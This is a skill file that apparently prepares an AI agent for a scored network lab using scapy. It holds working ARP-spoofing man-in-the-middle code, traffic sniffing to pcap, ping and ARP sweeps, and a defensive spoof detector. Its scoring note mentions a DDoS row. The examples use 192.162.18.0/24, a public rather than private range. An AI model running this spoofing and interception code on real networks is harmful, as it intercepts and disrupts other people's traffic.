---
name: scapy-network-skill
description: Use when crafting, sending or dissecting raw packets with scapy — ARP scans and ARP spoofing (correct MAC→bytes handling, restore-on-exit), ICMP ping sweeps, bounded sniffing to pcap, duplicate-IP/MAC spoof detection, and MITM evidence collection. Includes ready-made wrapper scripts that validate arguments before importing scapy.
---

# scapy-network-skill

Raw-packet toolkit (scapy). `python3-scapy` is installed in the agent image
(system python) and `scapy` also lives in `/opt/mcp-venv`. Raw sockets need
`CAP_NET_RAW` (agent containers run root with `NET_RAW`/`NET_ADMIN`). The
`ping` binary is installed too; the wrappers use scapy so results are
parseable.

## Quick start (wrappers — validated argv, no shell)

```bash
scripts/arp_scan.py 192.162.18.0/24 --iface eth1               # live hosts -> markdown table
scripts/arp_spoof.py 192.162.18.2 192.162.18.1 --iface eth1    # MITM; restores on Ctrl-C
scripts/ping_sweep.py 192.162.18.0/24 --timeout 2              # ICMP sweep
scripts/sniff.py eth1 /captures/arp.pcap --count 200 --filter arp   # bounded capture
```

Exit codes: 2 invalid arguments · 3 prerequisite missing (e.g. unresolved
MACs) · 4 failure · 1 zero results. Wrappers validate arguments BEFORE
importing scapy, so bad invocations fail cleanly even without scapy.

## Raw-scapy cookbook

### ARP sweep (batch, with per-host fallback)

```python
from scapy.all import ARP, Ether, srp


def arp_sweep(cidr, iface, timeout=2, retry=3):
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    kwargs = dict(timeout=timeout, retry=retry, iface=iface, verbose=0)
    answered, _ = srp(broadcast / ARP(pdst=cidr), **kwargs)
    return {r[ARP].psrc: r[ARP].hwsrc for _, r in answered}
```

Batch sweeps on busy segments can come back EMPTY (round 0: a full-subnet
scan returned nothing while 2-host probes worked) — always fall back to
probing hosts one by one.

### MAC handling — the struct trap

MAC octets are HEX strings. Round 0 crashed with
`struct.error: 'B' format requires 0 <= number <= 255`:

```python
# WRONG — octets are hex; struct 'B' takes 0..255:
mac = b"".join(struct.pack("B", o) for o in "aa:bb:cc:dd:ee:ff".split(":"))

# RIGHT — let scapy resolve, or convert with bytes.fromhex:
from scapy.all import getmacbyip

mac = getmacbyip("192.162.18.1")  # handles ARP resolution for you
raw = bytes.fromhex("aabbccddeeff")  # manual conversion when you need bytes
struct.pack("B", int("aa", 16))  # per-octet, if you must
```

Never hand-pack MACs; resolve with `getmacbyip` (run `arp_scan.py` first if
the segment is silent).

### ARP spoof (bidirectional MITM, restore on exit)

```python
from scapy.all import ARP, Ether, conf, getmacbyip, sendp

target, gateway, iface = "192.162.18.2", "192.162.18.1", "eth1"
tmac, gmac = getmacbyip(target), getmacbyip(gateway)
our = conf.iface.mac
t_spoof = Ether(dst=tmac, src=our) / ARP(
    op=2, psrc=gateway, pdst=target, hwdst=tmac, hwsrc=our
)
g_spoof = Ether(dst=gmac, src=our) / ARP(
    op=2, psrc=target, pdst=gateway, hwdst=gmac, hwsrc=our
)
try:
    sendp(t_spoof, iface=iface, verbose=0)
    sendp(g_spoof, iface=iface, verbose=0)
finally:
    t_ok = Ether(dst=tmac) / ARP(
        op=2, psrc=gateway, pdst=target, hwdst=tmac, hwsrc=gmac
    )
    g_ok = Ether(dst=gmac) / ARP(
        op=2, psrc=target, pdst=gateway, hwdst=gmac, hwsrc=tmac
    )
    for _ in range(3):
        sendp(t_ok, iface=iface, verbose=0)
        sendp(g_ok, iface=iface, verbose=0)
```

Use `sendp` (L2) for Ether-layer frames, not `send` (L3).

### Defender: spoof detection

```python
from scapy.all import sniff

pkts = sniff(iface="eth1", filter="arp", count=200, timeout=60)
pairs = {
    (p[ARP].psrc, p[ARP].hwsrc) for p in pkts if p.haslayer(ARP) and p[ARP].op == 2
}
seen: dict[str, str] = {}
for src, hw in sorted(pairs):
    if src in seen and seen[src] != hw:
        print(f"ARP SPOOF: {src} announced at {seen[src]} AND {hw}")
    seen[src] = hw
```

Also watch for gratuitous-ARP storms and duplicate MACs across IPs
(`scripts/sniff.py eth1 /captures/arp.pcap --filter arp`, then hand the pcap
to the pcap2md MCP tools for dissection).

### Sniff to pcap, analyze with the MCP tools

```python
from scapy.all import sniff, wrpcap

pkts = sniff(iface="eth1", filter="tcp port 8080", count=500, timeout=120)
wrpcap("/captures/mitm.pcap", pkts)
```

Then `pcap_summary_md` / `pcap_full_md` / `pcap_follow_stream_md` /
`pcap_report_md` (pcap2md MCP server) for LLM-readable analysis.

## Cookbook (raw commands)

- ICMP sweep: `sr(IP(dst="192.162.18.0/24")/ICMP(), timeout=2, retry=2, verbose=0)`
- SYN probe: `sr1(IP(dst=ip)/TCP(dport=8080, flags="S"), timeout=2, verbose=0)`
- DNS query: `sr1(IP(dst=dns)/UDP(dport=53)/DNS(qd=DNSQR(qname="app.lab.local")), verbose=0)`
- Hex dump of a built packet: `Ether()/IP(dst=ip)/TCP(dport=80, flags="S").hexdump()`

## Ethics / scoring

Everything is logged and deterministically scored. Raw-packet work against
lab targets is fair game; do not crash innocent clients beyond scoring intent
(`+2` DDoS row). Restore ARP caches when done — `arp_spoof.py` does it
automatically in a `finally` block.
